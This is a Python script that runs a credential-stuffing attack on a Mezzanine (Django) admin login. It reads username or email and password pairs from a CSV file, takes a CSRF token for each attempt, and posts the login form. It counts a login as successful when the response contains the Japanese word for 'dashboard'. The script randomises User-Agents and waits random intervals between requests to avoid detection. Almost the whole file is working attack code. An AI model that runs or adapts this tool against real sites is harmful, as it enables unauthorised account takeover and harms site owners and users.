# -*- coding: utf-8 -*-

import configparser
import csv
import os
import random
from time import sleep

import requests
from fake_useragent import UserAgent


def acccess(http_info):
    request_info = http_info
    for key in ('payload', 'headers', 'querystring'):
        if key not in http_info:
            request_info[key] = {}

    try:
        res = requests.request(
            request_info['method'],
            request_info['url'],
            data=request_info['payload'],
            headers=request_info['headers'],
            params=request_info['querystring'],
        )
        return res
    except Exception as e:
        print(e)


def interval(config):
    max_ = int(config.get('interval', 'max'))
    min_ = int(config.get('interval', 'min'))
    if max_ == min_:
        sleep(min_)
    else:
        sleep(random.uniform(min_, max_))


def attacker(user, pass_, config):
    useragent = config.get('http_headers', 'User-Agent')
    if useragent == "random":
        useragent = ua.random

    cookie = acccess({
        'method': 'GET',
        'url': config.get('general', 'url'),
        'headers': {
            'User-Agent': useragent,
            'Cookie': '',
            'Referer': '',
            'Accept': config.get('http_headers', 'accept'),
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': config.get('http_headers', 'accept_language'),
            'Content-Type': 'text/html; charset=utf-8',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Upgrade-Insecure-Requests': '1',
        },
    }).cookies['csrftoken']
    interval(config)

    res = acccess({
        'method': 'POST',
        'url': config.get('general', 'url'),
        'querystring': {'next': '/ja/admin'},
        'payload': 'username={}&password={}&this_is_the_login_form=1&mezzanine_login_interface=admin&csrfmiddlewaretoken={}'.format(user, pass_, cookie),
        'headers': {
            'User-Agent': useragent,
            'Cookie': 'csrftoken={}'.format(cookie),
            'Referer': config.get('http_headers', 'referer'),
            'Accept': config.get('http_headers', 'accept'),
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': config.get('http_headers', 'accept_language'),
            'Content-Type': 'application/x-www-form-urlencoded',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Upgrade-Insecure-Requests': '1',
        },
    })
    if res is not None:
        if "ダッシュボード" in res.text:
            result = "Succeeded"
        else:
            result = "Failed"
        print("User: {}, Pass: {}, Result: {}".format(user, pass_, result))
    else:
        print("response doesn't exsit. maybe, one or more http-headers are wrong.")
    interval(config)


def main():
    config = configparser.SafeConfigParser()
    config.read('./attacker.conf')

    with open((os.path.normpath(os.path.join(os.path.abspath('__file__'), './../account_list.csv')))) as f:
        reader = csv.reader(f)
        if config.get('general', 'account') == "username":
            account = 0
        elif config.get('general', 'account') == "email":
            account = 1
        else:
            print("Warn: don't exsit setting and so, set username account")
            account = 0
        for row in reader:
            attacker(str(row[account]), str(row[2]), config)


if __name__ == '__main__':
    main()
